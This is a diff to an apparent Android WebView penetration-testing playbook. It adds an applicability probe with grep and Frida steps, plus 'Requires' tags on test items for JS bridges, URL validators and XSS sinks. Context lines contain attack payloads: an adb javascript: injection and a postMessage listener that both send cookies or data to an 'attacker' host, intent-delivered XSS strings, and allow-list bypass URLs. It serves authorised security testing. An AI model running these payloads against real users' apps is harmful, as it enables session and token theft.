@@ -62,6 +62,32 @@ executing JavaScript inside a WebView that also carries a JS bridge, the app's s
 access, or a real web origin; and if so, what is the single most sensitive thing that reachable context can
 read or do?**
 
+## Applicability probe
+
+Run these against `$DEC` (= `$E/decompiled`), the manifest and `inventory/webviews.csv` before loading any D10 item. The domain applies if ANY probe is non-zero; a zero static sweep on a hybrid-framework app is never n/a (the WebView lives in the framework, not the app's sources).
+
+```bash
+# 1. WebView classes, subclasses, framework WebViews and androidx.webkit users
+grep -rlE 'android\.webkit\.WebView|androidx\.webkit\.|extends WebView|new WebView\(|RNCWebView|SystemWebView|getcapacitor\.Bridge|WebViewFlutter|InAppWebView' "$DEC/jadx/sources" | wc -l
+# 2. Bridges of every kind (annotated, message-listener, prompt-based)
+grep -rlE '@JavascriptInterface|addJavascriptInterface\(|addWebMessageListener\(|postWebMessage\(|addDocumentStartJavaScript\(|onJsPrompt\(' "$DEC/jadx/sources" | wc -l
+# 3. Inline HTML templates and asset-loader origins (invisible to asset greps — gap #134)
+grep -rlE 'loadDataWithBaseURL\(|\.loadData\(|<html|<script|appassets\.androidplatform\.net|file:///android_asset' "$DEC/jadx/sources" | wc -l
+# 4. Hybrid frameworks that ARE a WebView
+ls -d "$DEC/apktool/assets/www" "$DEC/apktool/assets/public" "$DEC/apktool/assets/capacitor.plugins.json" "$DEC/apktool/assets/index.android.bundle" "$DEC/apktool/assets/flutter_assets" 2>/dev/null
+grep -lE 'EnableSafeBrowsing|android\.webkit\.WebView\.MetricsOptOut|WebViewActivity|WebviewActivity' "$DEC/apktool/AndroidManifest.xml"
+# 5. Seed and count the inventory (W-NNN rows)
+python3 scripts/inventory.py --jadx "$DEC/jadx" --out "$E/inventory/" && tail -n +2 "$E/inventory/webviews.csv" | wc -l
+```
+
+Runtime confirmation (required before writing n/a, because SDK-created WebViews are instantiated lazily): attach Frida to the device by serial (`frida -D <serial> -n <pkg> -t 20 -l frida/<webview-census>.js`), exercise the main UI paths (help, promo, checkout, support chat, ads), and count `Java.choose('android.webkit.WebView')` instances. Record the count and the screens exercised.
+
+n/a note text (write it into every D10 row and the domain summary):
+
+`D10 n/a: 0 WebView users in $DEC/jadx/sources (probe 1-3 = 0/0/0), no hybrid-framework assets (probe 4 empty), inventory/webviews.csv header-only after --jadx seeding, and Java.choose('android.webkit.WebView') returned 0 instances after exercising <screens> on <device/build> at <date>. Re-open if a later build adds a WebView or an SDK with one.`
+
+Partial applicability: if probe 1 > 0 but probe 2 = 0 and no hybrid framework is present, execute D10-001/002/016..054/063..072 and mark D10-003..015, D10-055..062, D10-064, D10-072 `n/a: no bridge (probe 2 = 0, confirmed by the D10-003 runtime hook)`. Framework-specific items are gated by `target.framework` (see Requires plan).
+
 ## Triage order
 
 1. **Inventory and audit on the concrete class** (D10-001). Read every WebView's live settings off
@@ -94,6 +120,7 @@ read or do?**
 | **VRT** | n/a (enabler; the reachable misconfiguration it uncovers is the finding) |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
+| **Requires** | webview |
 | **Maps to** | MASTG-TEST-0251, MASTG-TEST-0253, MASTG-TECH-0043/-0044/-0045, MASTG-DEMO-0030, `com.android.webview.chromium.ContentSettingsAdapter` |
 
 - **Test:** Locate every WebView activity/fragment, every custom `WebView` subclass, every framework WebView
@@ -102,8 +129,8 @@ read or do?**
   or a framework never match a setter grep.
 - **How:**
   ```bash
-  grep -rn "extends WebView\|new WebView(\|setWebViewClient(\|WebViewClient()" jadx_out/sources | sort -u
-  grep -rnE "setJavaScriptEnabled|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|setAllowContentAccess|setDomStorageEnabled|setMixedContentMode|setSafeBrowsingEnabled" jadx_out/sources
+  grep -rn "extends WebView\|new WebView(\|setWebViewClient(\|WebViewClient()" $DEC/jadx/sources | sort -u
+  grep -rnE "setJavaScriptEnabled|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|setAllowContentAccess|setDomStorageEnabled|setMixedContentMode|setSafeBrowsingEnabled" $DEC/jadx/sources
   ```
   `android.webkit.WebSettings` is **abstract** — hooking it fires zero times. Read the live object instead
   (MASTG-DEMO-0030's script):
@@ -140,6 +167,7 @@ read or do?**
 | **VRT** | n/a (enabler) |
 | **Attacker** | AM-02 |
 | **Applies to** | all WebView apps |
+| **Requires** | webview |
 | **Maps to** | `risks/unsafe-uri-loading`; local corpus "Map the WebView layer first" |
 
 - **Test:** One class usually decides the security of the whole surface: the URL/allow-list validator that both
@@ -148,7 +176,7 @@ read or do?**
   call site, not a parser bypass.
 - **How:**
   ```bash
-  grep -rn "loadUrl(\|loadDataWithBaseURL(\|addJavascriptInterface(\|prefetch\|preload\|warmup" jadx_out/sources | sort -u
+  grep -rn "loadUrl(\|loadDataWithBaseURL(\|addJavascriptInterface(\|prefetch\|preload\|warmup" $DEC/jadx/sources | sort -u
   # diff the validator's call sites against every load/attach site
   ```
   Worked shape (Meesho): validator `C19575i` with `m34172a(url,true)`=authorise-attach, `m34173b(...)`=authorise-load,
@@ -168,6 +196,7 @@ read or do?**
 | **VRT** | n/a (enabler; the reachable sensitive method is the finding) |
 | **Attacker** | AM-02 |
 | **Applies to** | all apps with `addJavascriptInterface` |
+| **Requires** | webview, js-bridge |
 | **Maps to** | MASTG-TEST-0334, MASWE-0033 (CWE-749), MASTG-TECH-0043; `risks/insecure-webview-native-bridges` |
 
 - **Test:** Do not stop at "a bridge exists". Read every annotated method body and classify each by what it
@@ -175,7 +204,7 @@ read or do?**
   the whole domain is the most sensitive reachable capability.
 - **How:**
   ```bash
-  S=jadx_out/sources
+  S=$DEC/jadx/sources
   grep -rl "@JavascriptInterface" $S ; grep -rn "addJavascriptInterface(" $S           # bridge name = 2nd arg
   grep -rn -A20 '@JavascriptInterface' $S | grep -nE 'return|getHeader|token|cookie|Authorization|readFile|exec|openUrl'
   grep -rn 'Interceptor|addHeader|Request.Builder' $S | grep -iE 'token|auth|session'  # the header factory
@@ -210,6 +239,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all apps with `addJavascriptInterface` + a delivery path (D10-016+) |
+| **Requires** | webview, js-bridge |
 | **Maps to** | MASTG-TEST-0334, MASWE-0033, ATT&CK T1407/T1635; H1 #401793, #1343300, #1500614, #189793; CWE-929 |
 
 - **Test:** With a reachable token-returning method (D10-003) and a way to load attacker content (D10-016+), call
@@ -241,6 +271,7 @@ read or do?**
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-02 (with cleartext/MitM or a reachable origin) |
 | **Applies to** | LEGACY — `minSdkVersion < 17` only |
+| **Requires** | webview, js-bridge, targetsdk<17, legacy |
 | **Maps to** | CVE-2012-6636, CVE-2013-4710, CVE-2014-0514, CVE-2014-4968; drozer `exploit.remote.webview.addjavascriptinterface`; EDB 42288/34088/32884/41675/31519 |
 
 - **Test:** Below API 17 an injected object exposes **all public methods** including those inherited from `Object`,
@@ -249,7 +280,7 @@ read or do?**
 - **How:**
   ```bash
   aapt2 dump badging target.apk | grep -E 'sdkVersion|targetSdkVersion'
-  grep -rn 'addJavascriptInterface(' jadx_out/sources ; grep -rn '@JavascriptInterface' jadx_out/sources | wc -l  # 0 annotations + low floor
+  grep -rn 'addJavascriptInterface(' $DEC/jadx/sources ; grep -rn '@JavascriptInterface' $DEC/jadx/sources | wc -l  # 0 annotations + low floor
   ```
   Payload (EDB 42288/34088 shape):
   ```html
@@ -276,6 +307,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 / AM-09 |
 | **Applies to** | all WebViews with `addJavascriptInterface` |
+| **Requires** | webview, js-bridge |
 | **Maps to** | MASTG-TEST-0334 ("`WebView.getUrl()` is not a reliable way to determine which frame invoked"); `risks/insecure-webview-native-bridges` ("injected into every frame, including iframes") |
 
 - **Test:** `addJavascriptInterface` injects the object into **every frame**, but nav/bridge gates commonly run only
@@ -283,7 +315,7 @@ read or do?**
   cross-origin iframe on an allow-listed page therefore executes with the bridge while the main-frame guard passes.
 - **How:**
   ```bash
-  grep -rn 'isForMainFrame\|shouldInterceptRequest\|shouldOverrideUrlLoading' jadx_out/sources -A6
+  grep -rn 'isForMainFrame\|shouldInterceptRequest\|shouldOverrideUrlLoading' $DEC/jadx/sources -A6
   # for each bridge method, check whether its guard reads webView.getUrl() rather than the calling frame's origin
   ```
   Host on an allow-listed origin (or an origin the app loads, or via a vendor open redirect):
@@ -303,13 +335,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all; always diff variants |
+| **Requires** | webview, js-bridge |
 | **Maps to** | local corpus residual pattern 3 (Meesho checkout `xoox` `C14497h` re-checks; BNPL `xoox` `C1535g` has no gate) |
 
 - **Test:** Apps ship several bridge objects (checkout, BNPL, rewards) under the same or similar JS-visible names.
   One has a per-call origin gate; another has none. Diff them.
 - **How:**
   ```bash
-  grep -rn 'addJavascriptInterface(' jadx_out/sources           # list every class registering each JS name
+  grep -rn 'addJavascriptInterface(' $DEC/jadx/sources           # list every class registering each JS name
   # for each variant, check for an origin/permission check at the TOP of the method body, not just at attach time
   ```
 - **Proof:** A side-by-side of two variants — one with the gate, one without — plus a call to the unguarded variant
@@ -327,13 +360,14 @@ read or do?**
 | **VRT** | `unvalidated_redirects_and_forwards.open_redirect.get_based` (P4) floor; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the sibling also attaches a bridge/headers |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
+| **Requires** | webview, js-bridge |
 | **Maps to** | local corpus residual pattern 1/2 (Meesho `Profile.prefetchUrl`, raw `WebView` `C14505l`) |
 
 - **Test:** A *different* code path loads the same URL without the allow-list, or a raw (non-custom) `WebView`
   instance skips the validator entirely. Prefetch/warmup paths fire on the raw deep-link URL *before* validation.
 - **How:**
   ```bash
-  grep -rn 'new WebView(\|extends WebView\|WebViewClient()\|prefetch\|preload\|warmup' jadx_out/sources | sort -u
+  grep -rn 'new WebView(\|extends WebView\|WebViewClient()\|prefetch\|preload\|warmup' $DEC/jadx/sources | sort -u
   # diff every load site against the validator's call sites from D10-002
   ```
 - **Proof:** `logcat` shows `prefetch failed for https://attacker…` — a forced GET to an attacker host from the
@@ -351,6 +385,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it gates a token getter |
 | **Attacker** | AM-02 |
 | **Applies to** | all bridged WebViews |
+| **Requires** | webview, js-bridge |
 | **Maps to** | MASTG-TEST-0334 ("`WebView.getUrl()` is not a reliable way to determine which frame invoked the interface") |
 
 - **Test:** A bridge method that authorises itself by reading `webView.getUrl()` is checking the top-level document
@@ -358,7 +393,7 @@ read or do?**
   children — so origin checks built on it are themselves a finding.
 - **How:**
   ```bash
-  grep -rn 'getUrl()' jadx_out/sources -B3 -A6 | grep -iE 'JavascriptInterface|allow|trusted|host|origin'
+  grep -rn 'getUrl()' $DEC/jadx/sources -B3 -A6 | grep -iE 'JavascriptInterface|allow|trusted|host|origin'
   ```
   Exercise via the iframe path (D10-006), a mid-navigation race, or the child-window path (D10-030).
 - **Proof:** The bridge returns its value to a context whose true origin is attacker-controlled while
@@ -375,6 +410,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | apps using `androidx.webkit` `WEB_MESSAGE_LISTENER` |
+| **Requires** | webview, js-bridge |
 | **Maps to** | `risks/insecure-webview-native-bridges` ("Lack of origin checks on message endpoints"); MASWE-0033 |
 
 - **Test:** The modern replacement for `addJavascriptInterface` is
@@ -383,8 +419,8 @@ read or do?**
   an injected iframe, calls the native object. Reviewers who only grep `addJavascriptInterface` miss this.
 - **How:**
   ```bash
-  grep -rnE 'addWebMessageListener|allowedOriginRules|addDocumentStartJavaScript' jadx_out/sources -A4
-  grep -rn '"\*"' jadx_out/sources | grep -i origin
+  grep -rnE 'addWebMessageListener|allowedOriginRules|addDocumentStartJavaScript' $DEC/jadx/sources -A4
+  grep -rn '"\*"' $DEC/jadx/sources | grep -i origin
   ```
   From an unrelated origin loaded into that WebView: `myNativeBridge.postMessage(JSON.stringify({cmd:'getToken'}))`.
 - **Proof:** The origin-rule set contains `*`/`https://*`, plus a PoC page on an unrelated origin calling the listener
@@ -401,6 +437,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the channel carries a token |
 | **Attacker** | AM-02 |
 | **Applies to** | all; frequently missed (scanners only grep `addJavascriptInterface`) |
+| **Requires** | webview, js-bridge |
 | **Maps to** | `risks/insecure-webview-native-bridges` ("Avoid using `*` as target origin"; `loadData()` gives a null origin); `WebMessagePort.java` |
 
 - **Test:** A `MessageChannel` bridge posting to `"*"` has no origin binding and accepts messages from any frame,
@@ -408,8 +445,8 @@ read or do?**
   use `loadDataWithBaseURL` with a real HTTPS base.
 - **How:**
   ```bash
-  grep -rnE 'postWebMessage|createWebMessageChannel|WebMessagePort|setWebMessageCallback' jadx_out/sources -A6
-  grep -rn 'Uri.parse("\*")\|"\*"' jadx_out/sources | grep -i webmessage
+  grep -rnE 'postWebMessage|createWebMessageChannel|WebMessagePort|setWebMessageCallback' $DEC/jadx/sources -A6
+  grep -rn 'Uri.parse("\*")\|"\*"' $DEC/jadx/sources | grep -i webmessage
   ```
   From an attacker frame: `window.addEventListener('message', e => fetch('https://attacker/?m='+btoa(e.data)))` and
   `port.postMessage(JSON.stringify({cmd:'getToken'}))`.
@@ -427,6 +464,7 @@ read or do?**
 | **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all apps with a generic JS bridge dispatcher |
+| **Requires** | webview, js-bridge |
 | **Maps to** | HackTricks webview-attacks.md ("Abusing dispatcher-style JS bridges", "Arbitrary file read via URI → File sinks"); KuCoin `HybridJsInterface.prompt` |
 
 - **Test:** A single exported method that deserialises attacker JSON and dispatches on a handler name is a generic
@@ -455,6 +493,7 @@ read or do?**
 | **VRT** | `server_security_misconfiguration.path_traversal` (VARIES); `server_side_injection.remote_code_execution_rce` (P1) only if a code-load path is writable |
 | **Attacker** | AM-02 |
 | **Applies to** | all bridges accepting `(content, fileName, mimeType)` |
+| **Requires** | webview, js-bridge |
 | **Maps to** | Mustafa Mohamed (2026, H1 public program); safe fix `getCacheDir().toPath().toRealPath()` + `startsWith` check |
 
 - **Test:** Bridges that write attacker `content` to `fileName` under cache/files with no canonicalisation let a
@@ -481,6 +520,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | bridges whose token getter delivers async via a JS callback |
+| **Requires** | webview, js-bridge |
 | **Maps to** | HackTricks webview-attacks.md ("Callback wrapping to steal credential-returning bridge results"); Fares Walid (SirBugs); Oversecured SmartThings `McsBridge.getAuthInfo()` |
 
 - **Test:** Many bridges return a token asynchronously by invoking a global JS callback (`window.callWebView({action:'refresh_jwt',...})`).
@@ -512,6 +552,7 @@ read or do?**
 | **VRT** | inherits the bridge severity (D10-004) |
 | **Attacker** | AM-02 |
 | **Applies to** | all bridged WebViews that ever navigate off-origin |
+| **Requires** | webview, js-bridge |
 | **Maps to** | `WebView.java` (`removeJavascriptInterface`); local corpus |
 
 - **Test:** The documented mitigation is to remove the interface before loading untrusted content "such as in
@@ -519,7 +560,7 @@ read or do?**
   (re)loaded" — so removal *after* navigation begins does not protect the already-loaded document.
 - **How:**
   ```bash
-  grep -rn 'removeJavascriptInterface' jadx_out/sources -B10 -A5   # confirm ordering vs loadUrl / navigation
+  grep -rn 'removeJavascriptInterface' $DEC/jadx/sources -B10 -A5   # confirm ordering vs loadUrl / navigation
   ```
 - **Proof:** Navigate the WebView off-origin and show `typeof window.<bridge> !== 'undefined'` rendered into the page
   and screenshotted.
@@ -535,6 +576,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the bypassed WebView carries a bridge/auth headers |
 | **Attacker** | AM-02 |
 | **Applies to** | all; backslash-authority variant is API ≤ 24 (LEGACY) |
+| **Requires** | webview |
 | **Maps to** | local corpus Class #16; Oversecured WebView checklist; `HierarchicalUri` reflection variant |
 
 - **Test:** A weak validator uses `contains`/`endsWith`/`startsWith`, is scheme-blind, or disagrees between the
@@ -568,13 +610,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all; `loadUrl("javascript:")` from an Intent is blocked on modern targetSdk — verify |
+| **Requires** | webview |
 | **Maps to** | H1 #499348 (Twitter Lite, Critical), #2555949 (US DoD), #3475626 (LinkedIn 8.1), #1737358 (Shopify) |
 
 - **Test:** Host allow-lists that check the host but never the scheme. Independent of any host bypass — a
   `javascript:`/`file:`/`content:`/`data:` URL whose "host" component matches the allow-list still passes.
 - **How:**
   ```bash
-  grep -rn 'getHost()' jadx_out/sources -B3 -A6 | grep -v 'getScheme()'   # host checked, scheme not
+  grep -rn 'getHost()' $DEC/jadx/sources -B3 -A6 | grep -v 'getScheme()'   # host checked, scheme not
   ```
   ```bash
   adb shell am start -n com.target/.WebActivity --es URL "javascript:(function(){location='https://attacker/?c='+document.cookie})()"
@@ -597,6 +640,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) as the precondition for bridge abuse |
 | **Attacker** | AM-02 |
 | **Applies to** | all (JS is off by default; the bug is *when* it is turned on) |
+| **Requires** | webview |
 | **Maps to** | HackTricks webview-attacks.md ("order-of-checks bug", Samsung S24 Pwn2Own 2024 chain) |
 
 - **Test:** A pipeline of parse → partial-validate → **configure WebView (JS on)** → final-verify → `loadUrl` leaves
@@ -619,6 +663,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the reached bridge |
 | **Attacker** | AM-02 / AM-03 |
 | **Applies to** | all |
+| **Requires** | webview |
 | **Maps to** | HackTricks webview-attacks.md ("scheme-only checks and `getReferrer()` are not auth"); `Activity.getReferrer()`, `Intent.EXTRA_REFERRER` |
 
 - **Test:** An exported `VIEW`/`BROWSABLE` activity that forwards `url=` into `loadUrl()` while the bridge stays
@@ -626,7 +671,7 @@ read or do?**
   returns `Intent.EXTRA_REFERRER` when present, which a caller can spoof.
 - **How:**
   ```bash
-  grep -rn 'getReferrer()\|EXTRA_REFERRER' jadx_out/sources
+  grep -rn 'getReferrer()\|EXTRA_REFERRER' $DEC/jadx/sources
   ```
   Browser trigger: `<a href="intent://webdialog?url=https%3A%2F%2Ftrusted%2Frewards#Intent;scheme=app;package=com.victim;end">`;
   or spoof the referrer from a PoC app by setting `Intent.EXTRA_REFERRER` to a trusted package/URI.
@@ -643,6 +688,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) once it reaches a bridge/file access |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
+| **Requires** | webview |
 | **Maps to** | MASTG-TEST-0398, MASTG-TEST-0400, MASWE-0035; `WebViewClient.java` "not called for" lists |
 
 - **Test:** An allow-list enforced only in these callbacks has documented holes. `shouldOverrideUrlLoading` is **not**
@@ -651,7 +697,7 @@ read or do?**
   `android_res`, is **not** called for redirect URLs (only the initial URL), and runs on a non-UI thread.
 - **How:**
   ```bash
-  grep -rn -A25 'shouldOverrideUrlLoading\|shouldInterceptRequest' jadx_out/sources
+  grep -rn -A25 'shouldOverrideUrlLoading\|shouldInterceptRequest' $DEC/jadx/sources
   ```
   Test page inside the WebView:
   ```html
@@ -673,6 +719,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | all apps that mix both surfaces (most consumer apps) |
+| **Requires** | webview |
 | **Maps to** | `developer.chrome.com/docs/android/custom-tabs`; `risks/unsafe-uri-loading` |
 
 - **Test:** Apps route "our domains" to a bridged WebView (with the session cookie) and "external" links to a Chrome
@@ -681,7 +728,7 @@ read or do?**
   the sandboxed Custom Tab.
 - **How:**
   ```bash
-  grep -rnE 'CustomTabsIntent|launchUrl|isInternalUrl|isTrustedHost|endsWith\("\.example\.com"\)|contains\("example.com"\)' jadx_out/sources
+  grep -rnE 'CustomTabsIntent|launchUrl|isInternalUrl|isTrustedHost|endsWith\("\.example\.com"\)|contains\("example.com"\)' $DEC/jadx/sources
   ```
   Attack the classifier: `https://example.com.attacker.tld`, `https://attacker.tld/?x=example.com`,
   `https://example.com@attacker.tld`, `https://EXAMPLE.COM.attacker.tld`, and any open redirect on the real host.
@@ -699,6 +746,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) if delivered stored |
 | **Attacker** | AM-02 |
 | **Applies to** | all |
+| **Requires** | webview |
 | **Maps to** | `WebView.java` (`loadDataWithBaseURL`); H1 #532836/#1455987 (Exness), Oversecured Evernote UXSS; local corpus Class #17 |
 
 - **Test:** `loadDataWithBaseURL(baseUrl, html, ...)` runs `html` in the origin of `baseUrl`. Control both and you have
@@ -706,7 +754,7 @@ read or do?**
   base rendering attacker HTML grants that HTML the app's real web origin including its cookies and localStorage.
 - **How:**
   ```bash
-  grep -rn 'loadDataWithBaseURL(' jadx_out/sources -B20 | grep -n 'getStringExtra\|getArguments\|getQueryParameter'
+  grep -rn 'loadDataWithBaseURL(' $DEC/jadx/sources -B20 | grep -n 'getStringExtra\|getArguments\|getQueryParameter'
   ```
   The SurveyMonkey SDK shape (Exness) — two extras straight into the sink:
   ```java
@@ -730,6 +778,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) if cross-user; else the bridge/file-access path |
 | **Attacker** | AM-02 / AM-03 |
 | **Applies to** | exported/proxy-reachable activities rendering Intent-derived HTML |
+| **Requires** | webview |
 | **Maps to** | HackTricks webview-attacks.md ("WebView XSS via Intent extras → loadData()"); KuCoin `kucoin:///link?data=`; CVE-2015-7893 (Samsung SecEmailUI) |
 
 - **Test:** Reading an attacker-controlled extra and injecting it into a WebView via `loadData()`/`loadDataWithBaseURL(null,...)`
@@ -737,7 +786,7 @@ read or do?**
   settings) `file://`/`content://`.
 - **How:**
   ```bash
-  grep -rn 'loadData(\|loadDataWithBaseURL(' jadx_out/sources
+  grep -rn 'loadData(\|loadDataWithBaseURL(' $DEC/jadx/sources
   adb shell am start -n com.victim/.ExportedWebViewActivity --es data '<img src=x onerror="alert(document.domain)">'
   adb shell am start -a android.intent.action.VIEW -d "kucoin:///link?data=%3Cscript%3Ealert(1)%3C/script%3E"
   ```
@@ -755,6 +804,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | `singleTop`/`singleTask` activities reusing a WebView across intents |
+| **Requires** | webview |
 | **Maps to** | Oversecured WebView checklist §7; local corpus Class #17 |
 
 - **Test:** `onNewIntent(i){ webView.loadUrl(i.getDataString()); }` on a reused WebView lets an attacker first load a
@@ -762,7 +812,7 @@ read or do?**
   origin.
 - **How:**
   ```bash
-  grep -rn 'onNewIntent' jadx_out/sources -A10 | grep -n 'loadUrl\|getDataString'
+  grep -rn 'onNewIntent' $DEC/jadx/sources -A10 | grep -n 'loadUrl\|getDataString'
   ```
   ```bash
   adb shell am start -n com.victim/.WebActivity -d 'https://legit.example/'
@@ -783,6 +833,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) when the concatenated value is server-stored and cross-user; else the bridge path |
 | **Attacker** | AM-02 / AM-05 |
 | **Applies to** | all; only exploitable if the interpolated value is attacker-controlled |
+| **Requires** | webview |
 | **Maps to** | Oversecured WebView checklist §8/§9 ("use JSON methods to sanitize"); local corpus Class #18 (the "Valmo F1 class") |
 
 - **Test:** Untrusted input concatenated into `evaluateJavascript("f('"+x+"')")` or `loadUrl("javascript:f('"+x+"')")`
@@ -790,7 +841,7 @@ read or do?**
   server-stored field — trace the source. If `x` is app/server-internal (Moshi JSON, a CDN URL), it is a nit, not a bug.
 - **How:**
   ```bash
-  grep -rn 'evaluateJavascript(' jadx_out/sources | grep '+' ; grep -rn 'loadUrl("javascript:' jadx_out/sources | grep '+'
+  grep -rn 'evaluateJavascript(' $DEC/jadx/sources | grep '+' ; grep -rn 'loadUrl("javascript:' $DEC/jadx/sources | grep '+'
   # then trace each interpolated variable back to getQueryParameter/getStringExtra/a provider row/a profile field
   ```
   ```
@@ -813,6 +864,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) |
 | **Attacker** | AM-02 / AM-05 |
 | **Applies to** | apps that build HTML by concatenation then `loadData`/`loadDataWithBaseURL` |
+| **Requires** | webview |
 | **Maps to** | H1 #283063 (IRCCloud, Medium), #176065 (Brave, High), #297547 (Simplenote) |
 
 - **Test:** Apps that build HTML by concatenation and render it. Any field reaching the template — image URL, title,
@@ -840,6 +892,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2); Critical when it reaches a bridge |
 | **Attacker** | AM-05 (another user of the same app) |
 | **Applies to** | all WebViews rendering backend-supplied content with JS enabled |
+| **Requires** | webview |
 | **Maps to** | H1 #176065, #283063, #189793, #87835, #121275, #41856, #297547, #230119; `risks/cross-app-scripting` |
 
 - **Test:** Content the backend returns (article body, chat message, profile field, image title, filename) rendered
@@ -869,6 +922,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) |
 | **Attacker** | AM-03 (malicious local app supplying a `content://` URI) |
 | **Applies to** | hybrid apps and any WebView that interpolates untrusted metadata into HTML |
+| **Requires** | webview |
 | **Maps to** | HackTricks webview-attacks.md ("Second-order WebView XSS through `ContentProvider` metadata"; Acode v1.10.5 Cordova zero-day) |
 
 - **Test:** Do not limit source-tracing to Intent extras or file bytes. An app may query an attacker-owned `content://`
@@ -898,13 +952,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on the reached origin |
 | **Attacker** | AM-02 (one tap/keypress required) |
 | **Applies to** | LEGACY — WebView engine < 83.0.4103.106; still live on non-updatable OEM/kiosk images |
+| **Requires** | webview, legacy |
 | **Maps to** | H1 #906433 (Twitter, High 8.1, CVE-2020-6506, crbug 1083819) |
 
 - **Test:** With multi-window support off (the default), a cross-origin iframe can call `window.open()` with a
   `javascript:` URL and execute in the **top-level** document.
 - **How:**
   ```bash
-  grep -rn 'setSupportMultipleWindows\|onCreateWindow' jadx_out/sources    # absence == vulnerable default
+  grep -rn 'setSupportMultipleWindows\|onCreateWindow' $DEC/jadx/sources    # absence == vulnerable default
   adb shell dumpsys package com.google.android.webview | grep versionName  # need < 83.0.4103.106
   ```
   Inside a cross-origin iframe on a page the app loads: `<script>window.open("javascript:alert(document.domain)")</script>`.
@@ -923,6 +978,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the child inherits a token bridge |
 | **Attacker** | AM-02 |
 | **Applies to** | apps with `setSupportMultipleWindows(true)` + an `onCreateWindow` handler |
+| **Requires** | webview |
 | **Maps to** | `WebChromeClient.java` (`onCreateWindow` — "no trustworthy way to tell which page requested the new window"); `WebSettings.java` defaults |
 
 - **Test:** When multi-window is supported, `onCreateWindow` cannot reliably tell which frame requested the window
@@ -930,7 +986,7 @@ read or do?**
   is false. A child WebView that inherits the JS bridge or the session is reachable from an attacker iframe.
 - **How:**
   ```bash
-  grep -rn 'onCreateWindow\|setSupportMultipleWindows\|setJavaScriptCanOpenWindowsAutomatically' jadx_out/sources -A15
+  grep -rn 'onCreateWindow\|setSupportMultipleWindows\|setJavaScriptCanOpenWindowsAutomatically' $DEC/jadx/sources -A15
   ```
 - **Proof:** A `window.open()` from an attacker iframe produces a new in-app WebView; enumerate `window.<bridge>` in
   the child window and screenshot the non-null return.
@@ -946,13 +1002,14 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-02 |
 | **Applies to** | defaults key on `targetSdk` — see below; on a modern target the setter must be explicit |
+| **Requires** | webview |
 | **Maps to** | MASTG-TEST-0252/-0253, MASWE-0034; `risks/webview-unsafe-file-inclusion`; H1 #499348, #288955 |
 
 - **Test:** With either enabled and any attacker-influenced content reachable, a `file://` page can XHR the app's
   private files and POST them out. The most reliable "arbitrary file read → ATO" primitive in the corpus.
 - **How:**
   ```bash
-  grep -rnE 'setAllowUniversalAccessFromFileURLs|setAllowFileAccessFromFileURLs|setAllowFileAccess|setJavaScriptEnabled' jadx_out/sources
+  grep -rnE 'setAllowUniversalAccessFromFileURLs|setAllowFileAccessFromFileURLs|setAllowFileAccess|setJavaScriptEnabled' $DEC/jadx/sources
